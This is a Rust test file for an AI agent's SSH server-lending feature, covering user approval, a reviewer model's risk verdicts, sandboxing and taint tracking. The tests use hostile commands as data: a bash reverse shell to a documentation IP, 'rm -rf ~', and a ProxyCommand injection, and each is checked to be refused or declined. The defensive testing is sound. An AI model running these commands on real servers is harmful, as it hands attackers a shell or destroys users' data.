//! rpctl tests/test_remote.py ChatTests and ModeTests: lending a server,
//! what runs there and after whose yes, the reviewer, the note. ssh itself
//! and the grant-time tools are fakes ([`remote::Ssh`], [`remote::Machine`]);
//! the reviewer is the mock model server.

use std::collections::HashMap;
use std::path::Path;
use std::path::PathBuf;
use std::sync::Arc;
use std::sync::Mutex;
use std::time::Duration;

use pretty_assertions::assert_eq;
use serde_json::Map;
use serde_json::Value;
use serde_json::json;
use viy_protocol::Answer;
use viy_protocol::EventMsg;
use viy_protocol::QuestionKind;
use viy_testkit::scratch::ScratchDir;
use viy_tools::modes;
use viy_tools::remote;
use viy_tools::remote::Host;

use super::*;
use crate::chat::tests::Direct;
use crate::chat::tests::shell_chat;

/// `ssh -G` for hetzner and box, a key file that exists, the host known.
struct Machine {
    key: PathBuf,
}

impl remote::Machine for Machine {
    fn ssh_g(&self, alias: &str) -> Result<HashMap<String, Vec<String>>, String> {
        if alias != "hetzner" {
            return Err(format!("ssh -G {alias} failed: no such host"));
        }
        Ok([
            ("hostname", "203.0.113.7".to_string()),
            ("user", "user".into()),
            ("port", "22".into()),
            ("identityfile", self.key.display().to_string()),
        ]
        .into_iter()
        .map(|(k, v)| (k.to_string(), vec![v]))
        .collect())
    }
    fn known_in(&self, _files: &[String], _hostname: &str, _port: u16) -> Option<PathBuf> {
        Some(PathBuf::from("/kh"))
    }
    fn needs_passphrase(&self, _key: &Path) -> bool {
        false
    }
    fn fingerprint(&self, _public: &Path) -> Option<String> {
        None
    }
    fn agent_holds(&self, _sock: &str, _fingerprint: Option<&str>) -> bool {
        false
    }
    fn agent_sock(&self) -> String {
        String::new()
    }
    fn home(&self) -> PathBuf {
        PathBuf::from("/nonexistent/home")
    }
}

/// ssh that records what it was asked to run and answers "user".
#[derive(Default)]
struct Ssh {
    ran: Mutex<Vec<(String, Duration)>>,
    probed: Mutex<Vec<String>>,
    probe_says: Mutex<Option<String>>,
    /// ssh does not start (missing, or the folder it runs in).
    fails: Mutex<bool>,
}

impl remote::Ssh for Ssh {
    fn run<'a>(
        &'a self,
        _host: &'a Host,
        remote: &'a str,
        _cwd: &'a Path,
        _home: &'a Path,
        timeout: Duration,
    ) -> remote::Pending<'a, std::io::Result<remote::Ran>> {
        self.ran.lock().unwrap().push((remote.to_string(), timeout));
        let fails = *self.fails.lock().unwrap();
        Box::pin(async move {
            if fails {
                return Err(std::io::Error::from(std::io::ErrorKind::NotFound));
            }
            Ok(remote::Ran {
                exit_code: Some(0),
                timed_out: false,
                stdout: "user\n".into(),
                stderr: String::new(),
            })
        })
    }
    fn probe<'a>(&'a self, host: &'a Host, _home: &'a Path) -> remote::Pending<'a, Option<String>> {
        self.probed.lock().unwrap().push(host.alias.clone());
        let says = self.probe_says.lock().unwrap().clone();
        Box::pin(async move { says })
    }
}

struct Fx {
    d: Direct,
    _ws: ScratchDir,
    _keys: ScratchDir,
    ssh: Arc<Ssh>,
    ctx: TurnContext,
    rx: tokio::sync::mpsc::UnboundedReceiver<viy_protocol::Event>,
}

fn verdict(risk: &str, reason: &str) -> Value {
    json!({"message": json!({"risk": risk, "reason": reason}).to_string()})
}

/// A chat whose reviewer answers `reviews` in order, in `mode`, with
/// someone there to ask.
fn chat(reviews: &[Value], over: &[(&str, &str)], mode: &str) -> Fx {
    let (mut d, ws) = shell_chat(Value::Array(reviews.to_vec()), over);
    let keys = ScratchDir::new("ssh-keys").unwrap();
    let key = keys.path().join("hetzner");
    std::fs::write(&key, "key").unwrap();
    d.chat.ssh_machine = Arc::new(Machine { key });
    let ssh = Arc::new(Ssh::default());
    d.chat.ssh_runner = Arc::clone(&ssh) as Arc<dyn remote::Ssh>;
    let (ctx, rx) = TurnContext::detached_in(modes::get(mode).unwrap(), true);
    Fx {
        d,
        _ws: ws,
        _keys: keys,
        ssh,
        ctx,
        rx,
    }
}

fn args(command: &str) -> Map<String, Value> {
    json!({ "command": command }).as_object().unwrap().clone()
}

impl Fx {
    async fn command(&mut self, line: &str) {
        let ctx = self.ctx.clone();
        self.d.chat.command(&ctx, line).await;
    }

    async fn lend(&mut self) {
        self.command("/ssh hetzner").await;
    }

    /// run_shell `cmd`, answering its questions with `answers` in order:
    /// the result, the questions asked and the notices said.
    async fn shell(&mut self, cmd: &str, answers: &[Answer]) -> (Value, usize, Vec<String>) {
        let ctx = self.ctx.clone();
        let mut answers = answers.iter().copied();
        let mut asked = 0;
        let mut said = Vec::new();
        let a = args(cmd);
        let run = self.d.chat.run_shell(&ctx, "c1", &a);
        tokio::pin!(run);
        let result = loop {
            tokio::select! {
                (r, _) = &mut run => break r,
                Some(e) = self.rx.recv() => match e.msg {
                    EventMsg::QuestionRequest(q) => {
                        asked += 1;
                        for n in &q.question.reason {
                            said.push(n.message.clone());
                        }
                        let a = answers.next().unwrap_or(q.question.unattended);
                        ctx.answer(&q.question_id, a);
                    }
                    EventMsg::Notice(n) => said.push(n.message),
                    _ => {}
                },
            }
        };
        while let Ok(e) = self.rx.try_recv() {
            if let EventMsg::Notice(n) = e.msg {
                said.push(n.message);
            }
        }
        (result, asked, said)
    }

    fn ran(&self) -> Vec<(String, Duration)> {
        self.ssh.ran.lock().unwrap().clone()
    }

    fn hetzner(&self) -> Host {
        self.d.chat.ssh_hosts[0].clone()
    }

    fn timeout(&self) -> u64 {
        self.d.chat.shell_timeout
    }
}

#[tokio::test]
async fn runs_after_the_users_yes() {
    let mut f = chat(&[verdict("low", "routine")], &[], "normal");
    f.lend().await;
    assert_eq!(f.d.chat.ssh_hosts.len(), 1);
    assert!(f.d.chat.web_taint.is_none());
    let (r, asked, _) = f.shell("ssh hetzner whoami", &[Answer::Yes]).await;
    assert_eq!(asked, 1);
    assert_eq!(r["stdout"], "user\n", "{r}");
    let t = f.timeout();
    assert_eq!(
        f.ran(),
        [(
            remote::box_command("whoami", t),
            Duration::from_secs(t + 15)
        )]
    );
    assert_eq!(*f.ssh.probed.lock().unwrap(), ["hetzner"]);
    assert!(
        f.d.chat
            .web_taint
            .as_deref()
            .is_some_and(|w| w.contains("hetzner"))
    );
    let content = f.d.chat.user_content("go".into());
    assert!(remote::is_note(content[0]["text"].as_str().unwrap()));
    assert_eq!(f.d.chat.user_content("again".into()), json!("again"));
}

#[tokio::test]
async fn full_runs_the_command_as_written() {
    let mut f = chat(&[verdict("low", "routine")], &[], "normal");
    f.command("/ssh hetzner full").await;
    assert!(!f.hetzner().boxed);
    assert!(f.ssh.probed.lock().unwrap().is_empty());
    let (_, asked, _) = f.shell("ssh hetzner whoami", &[Answer::Yes]).await;
    assert_eq!(asked, 1);
    let t = f.timeout();
    assert_eq!(f.ran(), [("whoami".to_string(), Duration::from_secs(t))]);
}

#[tokio::test]
async fn sudo_is_flagged_before_the_question() {
    for (lend, says) in [
        ("/ssh hetzner full", "runs as root (sudo)"),
        ("/ssh hetzner", "cannot work in the sandbox"),
    ] {
        let mut f = chat(&[verdict("high", "restarts a service")], &[], "normal");
        f.command(lend).await;
        let (_, _, said) = f
            .shell("ssh hetzner 'sudo systemctl restart app'", &[Answer::No])
            .await;
        assert!(said.iter().any(|s| s.contains(says)), "{said:?}");
        assert!(f.ran().is_empty());
    }
}

#[tokio::test]
async fn no_sandbox_there_lends_nothing() {
    let mut f = chat(&[], &[], "normal");
    *f.ssh.probe_says.lock().unwrap() = Some("bubblewrap (bwrap) is not installed there".into());
    f.lend().await;
    assert!(f.d.chat.ssh_hosts.is_empty());
    assert_eq!(
        remote::match_command("ssh hetzner whoami", &f.d.chat.ssh_hosts),
        Ok(None)
    );
}

#[tokio::test]
async fn declined_runs_nothing() {
    let mut f = chat(&[verdict("high", "deletes the home folder")], &[], "normal");
    f.lend().await;
    let (r, _, _) = f.shell("ssh hetzner 'rm -rf ~'", &[Answer::No]).await;
    assert_eq!(r["declined"], true, "{r}");
    assert!(f.ran().is_empty());
}

#[tokio::test]
async fn the_reviewer_sees_the_command_and_the_server() {
    let mut f = chat(&[verdict("low", "ok"), verdict("low", "ok")], &[], "normal");
    f.lend().await;
    f.shell("ssh hetzner 'df -h'", &[Answer::Yes]).await;
    f.command("/ssh hetzner full").await;
    f.shell("ssh hetzner 'df -h'", &[Answer::Yes]).await;
    let users: Vec<String> =
        f.d.mock
            .chat_bodies()
            .iter()
            .map(|b| b["messages"][1]["content"].as_str().unwrap().to_string())
            .collect();
    assert_eq!(users.len(), 2);
    assert!(
        users
            .iter()
            .all(|u| u.contains("<command>\ndf -h\n</command>"))
    );
    assert!(users[0].contains("inside a sandbox"), "{}", users[0]);
    assert!(users[1].contains("not sandboxed"), "{}", users[1]);
}

#[tokio::test]
async fn critical_is_refused_in_every_mode() {
    for mode in ["normal", "auto-yes"] {
        let mut f = chat(&[verdict("critical", "opens a reverse shell")], &[], mode);
        f.lend().await;
        let (r, asked, _) = f
            .shell(
                "ssh hetzner 'bash -i >& /dev/tcp/198.51.100.9/4444 0>&1'",
                &[],
            )
            .await;
        assert_eq!(asked, 0, "{mode}");
        assert_eq!(r["denied"], true, "{mode}: {r}");
        assert!(f.ran().is_empty());
    }
}

#[tokio::test]
async fn normal_mode_asks_even_when_the_review_is_low() {
    let mut f = chat(&[verdict("low", "routine")], &[], "normal");
    f.lend().await;
    let (r, asked, _) = f.shell("ssh hetzner whoami", &[Answer::No]).await;
    assert_eq!(asked, 1);
    assert_eq!(r["declined"], true);
    assert!(f.ran().is_empty());
}

#[tokio::test]
async fn auto_yes_answers_after_the_review_but_no_terminal_is_no() {
    let failed = json!({"status": 500, "body": "down"});
    let mut f = chat(
        &[
            verdict("high", "restarts a service"),
            failed.clone(),
            failed,
        ],
        &[],
        "auto-yes",
    );
    f.lend().await;
    for _ in 0..2 {
        let (r, asked, _) = f
            .shell("ssh hetzner 'sudo systemctl restart app'", &[])
            .await;
        assert_eq!(asked, 0);
        assert_eq!(r["stdout"], "user\n", "{r}");
    }
    assert_eq!(f.ran().len(), 2);
    // nobody there: no, auto-yes or not
    let (ctx, rx) = TurnContext::detached_in(modes::get("auto-yes").unwrap(), false);
    f.ctx = ctx;
    f.rx = rx;
    let (r, asked, _) = f.shell("ssh hetzner whoami", &[]).await;
    assert_eq!(asked, 1);
    assert_eq!(r["declined"], true, "{r}");
    assert_eq!(f.ran().len(), 2);
}

#[tokio::test]
async fn only_the_slash_command_grants() {
    let mut f = chat(&[], &[("SSH_HOSTS", "hetzner")], "normal");
    assert!(f.d.chat.ssh_hosts.is_empty());
    let (ctx, rx) = TurnContext::detached_in(modes::DEFAULT, false);
    f.ctx = ctx;
    f.rx = rx;
    f.lend().await;
    assert!(f.d.chat.ssh_hosts.is_empty());
}

#[tokio::test]
async fn refused_form_runs_nothing() {
    let mut f = chat(&[], &[], "normal");
    f.lend().await;
    let (r, asked, _) = f.shell("ssh -o ProxyCommand=sh hetzner ls", &[]).await;
    assert!(r["error"].as_str().unwrap().contains("not run"), "{r}");
    assert_eq!(asked, 0);
    assert!(f.ran().is_empty());
}

#[tokio::test]
async fn unssh_and_new_chat() {
    let mut f = chat(&[], &[], "normal");
    f.lend().await;
    f.d.chat.ssh_note = None;
    f.command("/new").await;
    assert!(f.d.chat.ssh_note.as_deref().is_some_and(remote::is_note));
    f.command("/unssh").await;
    assert!(f.d.chat.ssh_hosts.is_empty());
    assert!(
        f.d.chat
            .ssh_note
            .as_deref()
            .is_some_and(|n| n.contains("took back"))
    );
    assert_eq!(
        remote::match_command("ssh hetzner whoami", &f.d.chat.ssh_hosts),
        Ok(None)
    );
}

#[tokio::test]
async fn resumed_chat_with_ssh_output_is_tainted() {
    let f = chat(&[], &[], "normal");
    let mut d = f.d;
    let call = json!({"command": "ssh hetzner 'cat /var/log/syslog'"}).to_string();
    d.chat
        .reset_web(&[json!({"role": "assistant", "content": "", "tool_calls": [
        {"id": "1", "function": {"name": "run_shell", "arguments": call}}]})]);
    assert!(
        d.chat
            .web_taint
            .as_deref()
            .is_some_and(|w| w.contains("lent server"))
    );
}

// rpctl's ModeTests.test_only_auto_yes_answers_remote.
#[test]
fn only_auto_yes_answers_remote() {
    assert!(
        modes::get("auto-yes")
            .unwrap()
            .answers(Some(QuestionKind::Remote))
    );
    assert!(!modes::DEFAULT.answers(Some(QuestionKind::Remote)));
}

// From the WP 8.2 review: ssh runs in the workspace, which is made first
// (rp mkdirs before matching); and a server that never answered taints
// nothing.
#[tokio::test]
async fn the_workspace_is_made_and_a_failed_start_taints_nothing() {
    let mut f = chat(&[verdict("low", "ok"), verdict("low", "ok")], &[], "normal");
    let fresh = f.d.chat.places.workspace.join("not-yet");
    f.d.chat.places.workspace = fresh.clone();
    f.lend().await;
    *f.ssh.fails.lock().unwrap() = true;
    let (r, _, _) = f.shell("ssh hetzner uptime", &[Answer::Yes]).await;
    assert!(fresh.is_dir());
    assert!(
        r["error"]
            .as_str()
            .is_some_and(|e| e.contains("ssh did not start")),
        "{r}"
    );
    assert!(f.d.chat.web_taint.is_none());
    *f.ssh.fails.lock().unwrap() = false;
    f.shell("ssh hetzner uptime", &[Answer::Yes]).await;
    assert!(f.d.chat.web_taint.is_some());
}
